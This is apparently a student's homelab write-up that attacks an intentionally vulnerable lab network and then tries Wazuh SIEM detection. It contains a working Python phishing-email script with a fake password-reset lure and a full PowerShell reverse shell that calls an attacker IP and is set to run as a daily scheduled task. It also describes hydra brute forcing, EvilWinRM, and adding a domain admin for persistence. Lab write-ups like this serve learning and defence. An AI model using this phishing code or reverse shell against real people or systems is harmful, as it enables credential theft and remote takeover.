# Experiments Conducted
## Configuring a Vulnerable Environment
To make it possible to perform attacks on the setup homelab, vulnerabilities needed to be established. 

![Version-1-Vulnerabilities](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-vulnerabilities.png)

The vulnerabilities setup (shown in the image above) are:
- Insecure RDP (On DC)
- No Encryption (On DC)
- Insecure SSH Passwords (On Security Server)
- Phished Credentials (On Linux Workstation)
- Insecure WinRM Service (On Windows Workstation)

### Setting up SSH
---
Running ```sudo apt install openssh-server -y``` installed the ssh server service, which I then started with ```sudo systemctl start ssh; sudo systemctl enable ssh```. I then changed UFW rules to allow SSH connections.

![Version-1-SSH-Setup](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-ssh-started.png)

Proof of this can be seen above.

![Version-1-SSH-Config](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-edit-ssh-config.png)

I then edited these two options in the SSH config file and restarted the service.

I then performed the same steps on the Linux Client, apart from allowing root login in the SSH config file.

### Setting up Email
---
I installed postfix on the linux client and edited the configuration to link it to the homelab network, create a directory for mail to be stored in, and setup an email address mapping to the janed account. 

### Setting up Wazuh Alerts
---
I created a wazuh alert to trigger when multiple SSH login attempts fail. I set up the alert with the following filters, `decoder.name is sshd; rule.groups contains authentication_failed`. I also set up a wazuh alert to trigger when a WinRM logon occurs, which would indicate lateral movement occuring. I also set up a wazuh alert for when a specific file on the domain controller is modified.

## Performing Cyber Attacks
### Provisioning Kali Linux
---
To perform the cyber attacks, I provisioned a kali linux virtual machine to construct and launch attacks on the now vulnerable network.

---
### Reconnaissance and Initial Access
---
To begin, I performed an Nmap scan on the IP 10.0.0.8, the IP of the corporate server. It is possible to scan the 10.0.0.0/24 network and find this IP to have open ports, but since this is a simulated network, to save time I won't. This scan showed that port 22 for SSH is open on the corporate server.

![Version-1-NMAP-SCAN](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-nmap-scan.png)

Seeing that port 22 is open, I attempted an SSH connection, which prompted me for the password.

![Version-1-SSH-PASSWORD-PROMPT](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-ssh-password-prompt.png)

I then used hydra to attempt to brute force the password of the corporate server. Doing this revealed the password to be "november" which was the password set when configuring ssh. I then was able to connect to the corporate server using ssh.

![Version-1-HYDRA-SSH-CRACKED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-hydra-ssh-cracked.png)

### Phishing to achieve Lateral Movement
---
Now that the corporate server has been accessed, I can attempt to move to one of the devices connected to the server, in this case the linux workstation. After performing basic reconnaissance such as running `ip a` and `ps aux` to find any other IP addresses or processes of note, I found nothing of note. Running `netstat tuln` to see other network activity on the server uncovered two abnormal tcp connections on ports 1025 and 8025, which a quick google search reveals to be SMTP and MailHog.

![Version-1-NETSTAT](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-netstat.png)

Visiting http://10.0.0.8:8025 on the browser on the attacker machine allows full access to the mailhog inbox.

Using ChatGPT I can create a phishing email, which will appear to be a password reset email from another member of the organization, and contain a link to a phishing site the attacker is hosting. 

![Version-1-PHISHING-SITE](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-phishing-site.png)

When the victim types their credentials to verify their password, they will be written to a logfile on the attackers machine. 

To do this, I created the following script on the corporate server:

```
import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg["Subject"] = "Update Password!"
msg["From"] = "project-x-hrteam@corp.project-x-dc.com"
msg["To"] = "janed@linux-client"

# Plain text version (fallback)
msg.set_content("Hey Jane! This is HR, make sure to update your password info.")

# HTML version
html_content = """
<html>
  <body>
    <p>Hey Jane!<br>
We noticed an unusual login attempt on your account, and for your security, we have temporarily locked access. To restore access, please verify your account credentials within the next 24 hours. Failure to do so may result in permanent restrictions on your account.
To verify your credentials, please click the link below:</p>
<a href='http://10.0.0.50'>Verify My Account</a>
<p>For assistance, please contact our support team at support@company.com.
Thank you for your prompt attention to this matter.
Best regards,
ProjectX Security Team
    </p>
  </body>
</html>
"""

msg.add_alternative(html_content, subtype='html')

# Send the email
with smtplib.SMTP("localhost", 1025) as server:
    server.send_message(msg)
```

I then ran the script to send the email.

On the linux client the email poller script (in place of a typical email application such as Gmail or Outlook) printed the email for the victim to verify their email. Clicking on the link (in a real scenario it would appear as a hyperlink and be far less suspicious) leads to the phishing site.

![Version-1-EMAIL-RECEIVED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-email-received.png)

If the victim types in their credentials into the site, they will appear in the creds.log file on the attacker machine, meaning the attacker can now gain access to the linux workstation.

![Version-1-BREACHED-WORKSTATION](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-breached-workstation.png)

### Lateral Movement to achieve Privilege Escalation
---
Now that the Linux workstation has been breached, the goal is to move to other targets, and with that ultimately a higher value target, such as the domain controller.

Running an Nmap port scan on 10.0.0.100 (the windows client) uncovers port 5985 open which a google search reveals is the default port for unencrypted WinRM HTTP communication. 

![Version-1-NMAP-WINDOWS-CLIENT](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-nmap-windows-client.png)

Now that WinRM has been identified as the insecure service running, I can use NetExec to attempt to crack the login for WinRM using users and passwords txt files. This would take a long time and is not guaranteed to work, so in this case, two files users.txt and pass.txt were created containing the username and password of the Administrator account. This is obviously an unrealistic scenario but given large enough credential files or basic credentials, it could be realistic to crack the login.

![Version-1-WINRM-CRACKED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-winrm-cracked.png)

Using the credentials with EvilWinRM, I can establish a connection to the windows workstation with administrator privilege.

![Version-1-EVILWINRM](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-evilwinrm.png)

### Privilege Escalation to Domain Controller
---
Now the Windows workstation has been compromised, the IP of the domain controller can be exposed. In this fictional scenario, the domain controller can be fairly easily found running an nmap scan of 10.0.0.0/24 so this route doesn't to the domain controller doesn't make much sense to me.

![Version-1-DC-EXPOSED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-dc-exposed.png)

As seen above, running `nltest /dsgetdc:` on the WinRM connection reveals the IP to be 10.0.0.5. Scanning the port 10.0.0.5 reveals numerous open ports, but the most important one is 3389, which a google search reveals to be the default port for Microsoft RDP. This will be the vulnerable service to next be exploited.

Since the administrator credentials were exposed in the previous breach, using these in xfreerdp allows RDP access to the domain controller.

![Version-1-DC-BREACHED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-dc-breached.png)

### Data Exfiltration
---
A secret file is planted on the domain controller (obviously wouldn't be in the documents folder in a realistic scenario) and so to exfiltrate the sensitive information from the domain controller, I can use scp.

![Version-1-FILE-EXFILTRATED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-file-exfiltrated.png)

The file has now been copied to the attacker machine.

### Establishing Persistence
---
To establish persistence on the domain controller and hence the entire network, I created a new user and added it to the Administrators local group and Domain Admins global group.

I also created a revere shell python script using the following code:

```
$ip = "10.0.0.50" # Replace with your attacker's IP address
$port = 4444 # Replace with the port number you want to listen on
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true
$writer.WriteLine("Connected to reverse shell!")
while ($true) {
 try {
 # Read commands from the listener (attacker)
 $command = $reader.ReadLine()
 if ($command -eq 'exit') {
 break
 }
 # Execute the command on the target machine
 $output = Invoke-Expression $command 2>&1
 $writer.WriteLine($output)
 } catch {
 $writer.WriteLine("Error: $_")
 }
}
$client.Close()
```

I ran a http server on the attacker machine to upload the file to the domain controller and created a daily task that runs the reverse shell file.

![Version-1-REVERSE-SHELL-ESTABLISHED](https://github.com/gradyclark03/homelab-project/blob/main/screenshots/v1-reverse-shell-established.png)

The terminal on kali linux shows the reverse shell is connected (the commands on the RDP simulate the scheduled task running).

## Using Wazuh SIEM to Identify Attacks
The attacks performed were obviously designed for a simulated and insecure network and did not make any attempt to be undetected. Using a SIEM like Wazuh makes the attacker's actions known and can help trace back to the source of the attacks. 

I think the tutorial may have misconfigured the monitors for Wazuh because it seems to constantly flag WinRM logon so I can't differentiate the moment the windows workstation was breached to normal activity. 

It has however been interesting and beneficial to setup and use SIEM software and observe logs.
